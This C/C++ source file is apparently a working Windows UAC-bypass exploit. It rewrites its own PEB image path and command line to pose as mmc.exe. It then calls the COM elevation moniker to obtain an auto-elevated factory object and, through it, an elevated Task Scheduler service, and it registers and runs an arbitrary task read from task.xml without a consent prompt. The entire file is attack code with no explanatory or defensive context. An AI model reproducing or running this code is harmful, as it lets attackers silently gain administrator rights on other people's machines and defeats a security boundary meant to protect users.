
#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <comdef.h>
#include <wincred.h>
#include <taskschd.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "credui.lib")

#ifndef T_ELEVATION_MONIKER_ADMIN
#define T_ELEVATION_MONIKER_ADMIN L"Elevation:Administrator!new:"
#endif//T_ELEVATION_MONIKER_ADMIN

#ifndef UCM_DEFINE_GUID
#define UCM_DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
     EXTERN_C const GUID DECLSPEC_SELECTANY name \
                = { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }  
#endif

UCM_DEFINE_GUID(IID_ElevatedFactoryServer, 0x804BD226, 0xAF47, 0x04D71, 0xB4, 0x92, 0x44, 0x3A, 0x57, 0x61, 0x0B, 0x08);

interface IElevatedFactoryServer { CONST_VTBL struct IElevatedFactoryServerVtbl* lpVtbl; };

typedef struct IElevatedFactoryServerVtbl {

    BEGIN_INTERFACE

	HRESULT(STDMETHODCALLTYPE* QueryInterface)(
		__RPC__in IElevatedFactoryServer* This,
		__RPC__in REFIID riid,
		_COM_Outptr_ void** ppvObject);

    ULONG(STDMETHODCALLTYPE* AddRef)(
        __RPC__in IElevatedFactoryServer* This);

    ULONG(STDMETHODCALLTYPE* Release)(
        __RPC__in IElevatedFactoryServer* This);

    HRESULT(STDMETHODCALLTYPE* ServerCreateElevatedObject)(
        __RPC__in IElevatedFactoryServer* This,
        __RPC__in REFCLSID rclsid,
        __RPC__in REFIID riid,
        _COM_Outptr_ void** ppvObject);
    //incomplete definition
    END_INTERFACE
} *PIElevatedFactoryServerVtbl;

#define T_CLSID_VFServer L"{A6BFEA43-501F-456F-A845-983D3AD7B8F0}"


#define RTL_MAX_DRIVE_LETTERS 32
#define GDI_HANDLE_BUFFER_SIZE32  34
#define GDI_HANDLE_BUFFER_SIZE64  60
#define GDI_BATCH_BUFFER_SIZE 310

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#if !defined(_M_X64)
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32
#else
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64
#endif

typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;


typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;
typedef STRING* PSTRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _CLIENT_ID64 {
    ULONG64 UniqueProcess;
    ULONG64 UniqueThread;
} CLIENT_ID64, * PCLIENT_ID64;

typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    } DUMMYUNION0;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1; // Size=4 Offset=104 BitOffset=0 BitCount=1
            ULONG MarkedForRemoval : 1; // Size=4 Offset=104 BitOffset=1 BitCount=1
            ULONG ImageDll : 1; // Size=4 Offset=104 BitOffset=2 BitCount=1
            ULONG LoadNotificationsSent : 1; // Size=4 Offset=104 BitOffset=3 BitCount=1
            ULONG TelemetryEntryProcessed : 1; // Size=4 Offset=104 BitOffset=4 BitCount=1
            ULONG ProcessStaticImport : 1; // Size=4 Offset=104 BitOffset=5 BitCount=1
            ULONG InLegacyLists : 1; // Size=4 Offset=104 BitOffset=6 BitCount=1
            ULONG InIndexes : 1; // Size=4 Offset=104 BitOffset=7 BitCount=1
            ULONG ShimDll : 1; // Size=4 Offset=104 BitOffset=8 BitCount=1
            ULONG InExceptionTable : 1; // Size=4 Offset=104 BitOffset=9 BitCount=1
            ULONG ReservedFlags1 : 2; // Size=4 Offset=104 BitOffset=10 BitCount=2
            ULONG LoadInProgress : 1; // Size=4 Offset=104 BitOffset=12 BitCount=1
            ULONG LoadConfigProcessed : 1; // Size=4 Offset=104 BitOffset=13 BitCount=1
            ULONG EntryProcessed : 1; // Size=4 Offset=104 BitOffset=14 BitCount=1
            ULONG ProtectDelayLoad : 1; // Size=4 Offset=104 BitOffset=15 BitCount=1
            ULONG ReservedFlags3 : 2; // Size=4 Offset=104 BitOffset=16 BitCount=2
            ULONG DontCallForThreads : 1; // Size=4 Offset=104 BitOffset=18 BitCount=1
            ULONG ProcessAttachCalled : 1; // Size=4 Offset=104 BitOffset=19 BitCount=1
            ULONG ProcessAttachFailed : 1; // Size=4 Offset=104 BitOffset=20 BitCount=1
            ULONG CorDeferredValidate : 1; // Size=4 Offset=104 BitOffset=21 BitCount=1
            ULONG CorImage : 1; // Size=4 Offset=104 BitOffset=22 BitCount=1
            ULONG DontRelocate : 1; // Size=4 Offset=104 BitOffset=23 BitCount=1
            ULONG CorILOnly : 1; // Size=4 Offset=104 BitOffset=24 BitCount=1
            ULONG ChpeImage : 1; // Size=4 Offset=104 BitOffset=25 BitCount=1
            ULONG ReservedFlags5 : 2; // Size=4 Offset=104 BitOffset=26 BitCount=2
            ULONG Redirected : 1; // Size=4 Offset=104 BitOffset=28 BitCount=1
            ULONG ReservedFlags6 : 2; // Size=4 Offset=104 BitOffset=29 BitCount=2
            ULONG CompatDatabaseProcessed : 1; // Size=4 Offset=104 BitOffset=31 BitCount=1
        };
    } ENTRYFLAGSUNION;
    WORD ObsoleteLoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    } DUMMYUNION1;
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    } DUMMYUNION2;
    //fields below removed for compatibility
} LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;

typedef LDR_DATA_TABLE_ENTRY* PCLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;


typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;


typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
    // ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ReservedBits0 : 25;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PVOID* FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG LibLoaderTracingEnabled : 1;
            ULONG SpareTracingBits : 29;
        };
    };
    ULONGLONG CsrServerReadOnlySharedMemoryBase;
} PEB, * PPEB;

typedef struct _GDI_TEB_BATCH {
    ULONG	Offset;
    UCHAR	Alignment[4];
    ULONG_PTR HDC;
    ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME* Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _TEB {
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
#if defined(_M_X64)
    UCHAR SpareBytes[24];
#else
    UCHAR SpareBytes[36];
#endif
    ULONG TxFsContext;

    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#if defined(_M_X64)
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR SoftPatchPtr1;
    PVOID ThreadPoolData;
    PVOID* TlsExpansionSlots;
#if defined(_M_X64)
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SpareSameTebBits : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG SpareUlong0;
    PVOID ResourceRetValue;
} TEB, * PTEB;

typedef VOID(NTAPI* PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)(
    _In_    PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_    PVOID Context,
    _Inout_ BOOLEAN* StopEnumeration
    );

typedef PVOID NTAPI RTLINITUNICODESTRING(
    _Inout_	PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString
);
typedef RTLINITUNICODESTRING FAR* LPRTLINITUNICODESTRING;
static LPRTLINITUNICODESTRING RtlInitUnicodeString;

typedef NTSTATUS NTAPI RTLENTERCRITICALSECTION(
    _In_ PRTL_CRITICAL_SECTION CriticalSection
);
typedef RTLENTERCRITICALSECTION FAR* LPRTLENTERCRITICALSECTION;
static LPRTLENTERCRITICALSECTION RtlEnterCriticalSection;

typedef NTSTATUS NTAPI RTLLEAVECRITICALSECTION(
    _In_ PRTL_CRITICAL_SECTION CriticalSection
);
typedef RTLLEAVECRITICALSECTION FAR* LPRTLLEAVECRITICALSECTION;
static LPRTLLEAVECRITICALSECTION RtlLeaveCriticalSection;

typedef NTSTATUS NTAPI LDRENUMERATELOADEDMODULES(
    _In_opt_ ULONG Flags,
    _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction,
    _In_opt_ PVOID Context);
typedef LDRENUMERATELOADEDMODULES FAR* LPLDRENUMERATELOADEDMODULES;
static LPLDRENUMERATELOADEDMODULES LdrEnumerateLoadedModules;

typedef NTSTATUS NTAPI NTALLOCATEVIRTUALMEMORY(
    _In_        HANDLE ProcessHandle,
    _Inout_     PVOID* BaseAddress,
    _In_        ULONG_PTR ZeroBits,
    _Inout_     PSIZE_T RegionSize,
    _In_        ULONG AllocationType,
    _In_        ULONG Protect
);
typedef NTALLOCATEVIRTUALMEMORY FAR* LPNTALLOCATEVIRTUALMEMORY;
static LPNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory;

__inline struct _PEB* NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }

typedef struct _LDR_CALLBACK_CONTEXT {
    PPEB Peb;
    LPWSTR ImagePathName;
} LDR_CALLBACK_CONTEXT, * PLDR_CALLBACK_CONTEXT;

static VOID NTAPI LdrEnumModulesCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _Inout_ BOOLEAN* StopEnumeration
)
{
    PLDR_CALLBACK_CONTEXT pContext = (PLDR_CALLBACK_CONTEXT)Context;
    PPEB Peb = (PPEB)pContext->Peb;

    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, pContext->ImagePathName);

        LPWSTR BaseDllName = wcsrchr(pContext->ImagePathName, L'\\');
        if (BaseDllName != NULL) {
            BaseDllName += 1;
        }
        else {
            BaseDllName = pContext->ImagePathName;
        }
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

static BOOL SetImagePath(LPCWSTR ImagePathName) {
    HINSTANCE hinstStub = GetModuleHandleW((L"ntdll.dll"));
    if (hinstStub) {
        RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(hinstStub, "RtlInitUnicodeString");
        RtlEnterCriticalSection = (LPRTLENTERCRITICALSECTION)GetProcAddress(hinstStub, "RtlEnterCriticalSection");
        RtlLeaveCriticalSection = (LPRTLLEAVECRITICALSECTION)GetProcAddress(hinstStub, "RtlLeaveCriticalSection");
        LdrEnumerateLoadedModules = (LPLDRENUMERATELOADEDMODULES)GetProcAddress(hinstStub, "LdrEnumerateLoadedModules");
        NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtAllocateVirtualMemory");

        if (!RtlInitUnicodeString ||
            !RtlEnterCriticalSection ||
            !RtlLeaveCriticalSection ||
            !LdrEnumerateLoadedModules ||
            !NtAllocateVirtualMemory) {
            return FALSE;
        }

        NTSTATUS Status;
        PPEB Peb = NtCurrentPeb();
        SIZE_T RegionSize;

        PVOID Buffer = NULL;
        RegionSize = 0x1000;

        Status = NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &Buffer,
            0,
            &RegionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (NT_SUCCESS(Status)) {
            RtlZeroMemory(Buffer, 0x1000);
#pragma warning(push)
#pragma warning(disable:4996)
            wcscpy((LPWSTR)Buffer, ImagePathName);
#pragma warning(pop)
            RtlEnterCriticalSection(Peb->FastPebLock);

            RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, (LPWSTR)Buffer);
            RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, (LPWSTR)Buffer);

            RtlLeaveCriticalSection(Peb->FastPebLock);

            LDR_CALLBACK_CONTEXT Context = { 0 };
            Context.Peb = Peb;
            Context.ImagePathName = (LPWSTR)Buffer;
            LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, (PVOID)&Context);

            return TRUE;
        }
    }
    return FALSE;
}

HRESULT ucmAllocateElevatedObject(
    _In_ LPCWSTR lpObjectCLSID,
    _In_ REFIID riid,
    _In_ DWORD dwClassContext,
    _Outptr_ void** ppv
)
{
    DWORD       classContext;
    HRESULT     hr = E_FAIL;
    PVOID       ElevatedObject = NULL;
    BIND_OPTS3  bop;
    WCHAR       szMoniker[MAX_PATH];

    do {
        if (wcslen(lpObjectCLSID) > 64)
            break;

        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);

        classContext = dwClassContext;
        if (dwClassContext == 0)
            classContext = CLSCTX_LOCAL_SERVER;

        bop.dwClassContext = classContext;

#pragma warning(push)
#pragma warning(disable:4996)
        wcscpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
        wcscat(szMoniker, lpObjectCLSID);
#pragma warning(pop)
        hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);

    } while (FALSE);

    *ppv = ElevatedObject;

    return hr;
}

BOOL ucmxRegisterAndRunTask(
    _In_ ITaskService* TaskService,
    _In_ BSTR RegistrationData,
    _In_ const OLECHAR* TaskName,
    _In_ BOOL isTempTask
)
{
    HRESULT r = E_FAIL;
    VARIANT varDummy;

    ITaskFolder* pTaskFolder = NULL;
    IRegisteredTask* pTask = NULL;
    IRunningTask* pRunningTask = NULL;

    TASK_STATE taskState = TASK_STATE_UNKNOWN;

    BSTR bstrTaskFolder = NULL, bstrTaskName = NULL;

    do {
        bstrTaskFolder = SysAllocString(L"\\");
        if (bstrTaskFolder == NULL)
            break;

        bstrTaskName = SysAllocString(TaskName);
        if (bstrTaskName == NULL)
            break;

        VariantInit(&varDummy);

        r = TaskService->Connect(
            varDummy,
            varDummy,
            varDummy,
            varDummy);

        if (FAILED(r))
            break;

        r = TaskService->GetFolder(bstrTaskFolder, &pTaskFolder);
        if (r != S_OK || pTaskFolder == NULL)
            break;

        r = pTaskFolder->RegisterTask(bstrTaskName, RegistrationData, TASK_CREATE_OR_UPDATE,
            varDummy, varDummy, TASK_LOGON_INTERACTIVE_TOKEN, varDummy, &pTask);

        if (r == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {

            r = pTaskFolder->GetTask(bstrTaskName, &pTask);
            if (SUCCEEDED(r)) {

                pTask->Stop(0);
                pTask->Release();

                pTaskFolder->DeleteTask(bstrTaskName, 0);
            }

            r = pTaskFolder->RegisterTask(bstrTaskName, RegistrationData, 0,
                varDummy, varDummy, TASK_LOGON_INTERACTIVE_TOKEN, varDummy, &pTask);
        }

        if (r != S_OK || pTask == NULL)
            break;

        r = pTask->Run(varDummy, &pRunningTask);
        if (r != S_OK || pRunningTask == NULL)
            break;

        if (SUCCEEDED(pRunningTask->get_State(&taskState))) {
            if (taskState == TASK_STATE_RUNNING) {
                if (isTempTask) {
                    Sleep(5000);
                }
            }
        }

        if (isTempTask) {
            pRunningTask->Stop();
            pTaskFolder->DeleteTask(bstrTaskName, 0);
        }

    } while (FALSE);

    if (bstrTaskFolder)
        SysFreeString(bstrTaskFolder);

    if (bstrTaskName)
        SysFreeString(bstrTaskName);

    if (pRunningTask)
        pRunningTask->Release();

    if (pTask)
        pTask->Release();

    if (pTaskFolder)
        pTaskFolder->Release();

    return SUCCEEDED(r);
}

int wmain(int argc, wchar_t* argv[])
{
	HRESULT hr_init;

	wchar_t path[260] = { 0 };

#pragma warning(push)
#pragma warning(disable:4996)
	wcscpy((LPWSTR)path, argv[0]);
#pragma warning(pop)

    SetImagePath(L"C:\\windows\\system32\\mmc.exe");

	hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

	IElevatedFactoryServer* pElevatedServer = NULL;
	HRESULT r;
	r = ucmAllocateElevatedObject(T_CLSID_VFServer,
		IID_ElevatedFactoryServer,
		CLSCTX_LOCAL_SERVER,
		(VOID**)&pElevatedServer);

	ITaskService* pTaskService = NULL;

	r = pElevatedServer->lpVtbl->ServerCreateElevatedObject(pElevatedServer,
		CLSID_TaskScheduler,
		IID_ITaskService,
		(void**)&pTaskService);

    SetImagePath(path);
	printf("ITaskService: %p\n", pTaskService);

    unsigned char* xml = NULL;

	FILE* f;
	_wfopen_s(&f, L"task.xml", L"rb");
    if (f != NULL) {
        fseek(f, 0, SEEK_END);
        long size = ftell(f);
        fseek(f, 0, SEEK_SET);
        xml = (unsigned char*)malloc(size + sizeof(short));
        if (xml != NULL) {
            memset(xml, 0, size + sizeof(short));
            fread(xml, 1, size, f);
        }
        fclose(f);
        if (xml != NULL) {
            BSTR RegistrationData = ::SysAllocString(BSTR(xml));
            BOOL result = ucmxRegisterAndRunTask(pTaskService, RegistrationData, L"test", FALSE);
            printf("RegisterAndRunTask: %s\n", result ? "Succeeded" : "Failed");
            free(xml);
        }
    }
    
	if (SUCCEEDED(hr_init))
		CoUninitialize();

	system("pause");
	return 0;
}
